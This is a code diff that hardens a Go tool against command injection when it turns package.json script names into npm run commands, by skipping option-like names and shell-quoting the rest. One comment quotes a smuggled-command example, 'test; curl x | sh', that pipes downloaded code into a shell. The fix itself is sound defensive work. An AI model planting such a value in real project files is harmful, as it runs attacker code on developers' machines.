@@ -122,10 +122,18 @@ func (Npm) Commands(repoRoot string, settings map[string]string) ([]config.Resol
 
 	cmds := make([]config.ResolvedCommand, 0, len(names))
 	for _, name := range names {
+		if name == "" || strings.HasPrefix(name, "-") {
+			// A name starting with - would be read as an option by the
+			// package manager, not as a script; no real script needs one.
+			continue
+		}
 		cmd := config.ResolvedCommand{
 			ID:   namespacedID("npm", name),
 			Name: namespacedName("npm", name),
-			Run:  pm + " run " + name,
+			// The script name comes from package.json, so it is quoted:
+			// a key like "test; curl x | sh" must stay one argument to
+			// the package manager, not become shell code.
+			Run: pm + " run " + shellQuote(name),
 		}
 		if len(workspaces) > 0 {
 			cmd.Params = params
@@ -161,23 +169,28 @@ func npmArgs(pm, script, ws string) []string {
 // per-workspace form. The workspace name arrives as $LC_WORKSPACE, never
 // spliced into the text.
 func npmWorkspaceRun(pm, script string) string {
-	sub := npmArgs(pm, script, "$LC_WORKSPACE")
+	q := shellQuote(script)
 	return "if [ -z \"$LC_WORKSPACE\" ] || [ \"$LC_WORKSPACE\" = . ]; then\n" +
-		"  exec " + strings.Join(npmArgs(pm, script, "."), " ") + "\n" +
+		"  exec " + strings.Join(npmArgs(pm, q, "."), " ") + "\n" +
 		"fi\n" +
-		"exec " + strings.Join(quoteWS(sub), " ")
+		"exec " + strings.Join(npmArgs(pm, q, `"$LC_WORKSPACE"`), " ")
 }
 
-// quoteWS double-quotes the $LC_WORKSPACE argument.
-func quoteWS(args []string) []string {
-	out := make([]string, len(args))
-	for i, a := range args {
-		if a == "$LC_WORKSPACE" {
-			a = `"$LC_WORKSPACE"`
+// shellQuote makes s a single shell word. Plain names are left as they
+// are so the common case stays readable; anything else is wrapped in
+// single quotes, inside which the shell interprets nothing.
+func shellQuote(s string) string {
+	plain := s != ""
+	for _, c := range s {
+		if !(c >= 'a' && c <= 'z' || c >= 'A' && c <= 'Z' || c >= '0' && c <= '9' || strings.ContainsRune("_-.:/@+=,", c)) {
+			plain = false
+			break
 		}
-		out[i] = a
 	}
-	return out
+	if plain {
+		return s
+	}
+	return "'" + strings.ReplaceAll(s, "'", `'\''`) + "'"
 }
 
 // packageManager picks the manager by which lockfile is present, never
